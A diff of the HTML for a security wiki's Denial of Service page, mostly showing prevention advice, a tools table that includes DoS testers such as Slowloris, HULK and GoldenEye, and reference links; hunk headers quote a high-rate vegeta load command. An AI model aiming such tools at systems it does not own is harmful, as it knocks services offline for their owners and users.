+<h2 id="prevention">Prevention<a class="anchor" href="#prevention">#</a></h2>
 <ul>
 <li>Enforce strict input validation — limit query length to 1000 chars, file uploads to 10MB, JSON nesting to 10 levels maximum.</li>
 <li>Implement rate limiting at every layer — 100 requests/minute per IP, 10 concurrent connections per user, token bucket for API endpoints.</li>
@@ -2306,73 +2079,67 @@ vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report
 <li>Lock down actuator endpoints — expose only <code>/health</code>, require authentication for everything else, or disable completely in production.</li>
 </ul>
 <hr>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th><strong>Tool</strong></th>
-<th><strong>Purpose</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://github.com/gkbrk/slowloris" target="_blank" rel="noreferrer noopener nofollow">Slowloris</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Slow HTTP header attack testing</td>
-</tr>
-<tr>
-<td><a href="https://github.com/grafov/hulk" target="_blank" rel="noreferrer noopener nofollow">HULK</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>HTTP Unbearable Load King DoS tester</td>
-</tr>
-<tr>
-<td><a href="https://github.com/jseidl/GoldenEye" target="_blank" rel="noreferrer noopener nofollow">GoldenEye</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>HTTP/HTTPS DoS attack simulator</td>
-</tr>
-<tr>
-<td><a href="https://httpd.apache.org/docs/2.4/programs/ab.html" target="_blank" rel="noreferrer noopener nofollow">Apache Bench (ab)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Simple load testing and benchmarking</td>
-</tr>
-<tr>
-<td><a href="https://github.com/wrs/wrk" target="_blank" rel="noreferrer noopener nofollow">wrk</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>High-performance HTTP benchmarking</td>
-</tr>
-<tr>
-<td><a href="https://github.com/locustio/locust" target="_blank" rel="noreferrer noopener nofollow">Locust</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Python-based load testing framework</td>
-</tr>
-<tr>
-<td><a href="https://jmeter.apache.org/" target="_blank" rel="noreferrer noopener nofollow">JMeter</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Java-based load and performance testing</td>
-</tr>
-<tr>
-<td><a href="https://github.com/tsenart/vegeta" target="_blank" rel="noreferrer noopener nofollow">Vegeta</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>HTTP load testing tool in Go</td>
-</tr>
-<tr>
-<td><a href="https://prometheus.io/" target="_blank" rel="noreferrer noopener nofollow">Prometheus</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>System monitoring and alerting</td>
-</tr>
-<tr>
-<td><a href="https://grafana.com/" target="_blank" rel="noreferrer noopener nofollow">Grafana</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Metrics visualization and dashboards</td>
-</tr>
-<tr>
-<td><a href="https://www.elastic.co/" target="_blank" rel="noreferrer noopener nofollow">Elasticsearch</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Log aggregation and attack detection</td>
-</tr>
-<tr>
-<td><a href="https://github.com/giampaolo/psutil" target="_blank" rel="noreferrer noopener nofollow">psutil</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Python system monitoring library</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th><strong>Tool</strong></th>
+					<th><strong>Purpose</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><a href="https://github.com/gkbrk/slowloris" target="_blank" rel="noreferrer noopener nofollow">Slowloris</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Slow HTTP header attack testing</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/grafov/hulk" target="_blank" rel="noreferrer noopener nofollow">HULK</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>HTTP Unbearable Load King DoS tester</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/jseidl/GoldenEye" target="_blank" rel="noreferrer noopener nofollow">GoldenEye</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>HTTP/HTTPS DoS attack simulator</td>
+			</tr>
+			<tr>
+					<td><a href="https://httpd.apache.org/docs/2.4/programs/ab.html" target="_blank" rel="noreferrer noopener nofollow">Apache Bench (ab)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Simple load testing and benchmarking</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/wrs/wrk" target="_blank" rel="noreferrer noopener nofollow">wrk</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>High-performance HTTP benchmarking</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/locustio/locust" target="_blank" rel="noreferrer noopener nofollow">Locust</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Python-based load testing framework</td>
+			</tr>
+			<tr>
+					<td><a href="https://jmeter.apache.org/" target="_blank" rel="noreferrer noopener nofollow">JMeter</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Java-based load and performance testing</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/tsenart/vegeta" target="_blank" rel="noreferrer noopener nofollow">Vegeta</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>HTTP load testing tool in Go</td>
+			</tr>
+			<tr>
+					<td><a href="https://prometheus.io/" target="_blank" rel="noreferrer noopener nofollow">Prometheus</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>System monitoring and alerting</td>
+			</tr>
+			<tr>
+					<td><a href="https://grafana.com/" target="_blank" rel="noreferrer noopener nofollow">Grafana</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Metrics visualization and dashboards</td>
+			</tr>
+			<tr>
+					<td><a href="https://www.elastic.co/" target="_blank" rel="noreferrer noopener nofollow">Elasticsearch</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Log aggregation and attack detection</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/giampaolo/psutil" target="_blank" rel="noreferrer noopener nofollow">psutil</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Python system monitoring library</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="good-to-read">
-  Good to Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank" rel="noreferrer noopener nofollow">OWASP — Denial of Service Attacks</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://portswigger.net/web-security/denial-of-service" target="_blank" rel="noreferrer noopener nofollow">PortSwigger — Denial-of-Service Vulnerabilities</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2387,10 +2154,7 @@ vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report
 <li><a href="https://hackerone.com/hacktivity" target="_blank" rel="noreferrer noopener nofollow">HackerOne — GraphQL DoS Reports</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://www.netscout.com/what-is-ddos/application-layer-attacks" target="_blank" rel="noreferrer noopener nofollow">NETSCOUT — Application Layer DDoS Attacks</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://www.bugcrowd.com/glossary/application-level-denial-of-service-dos/" target="_blank" rel="noreferrer noopener nofollow">https://www.bugcrowd.com/glossary/application-level-denial-of-service-dos/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-community/attacks/Denial_of_Service</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2411,49 +2175,62 @@ vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Denial%20of%20Service%20%28DOS%29.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/CSV-Injection/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>CSV Injection</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/DOM-Clobbering/" class="flex align-center">
+        <span>DOM Clobbering</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2535,15 +2312,24 @@ vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
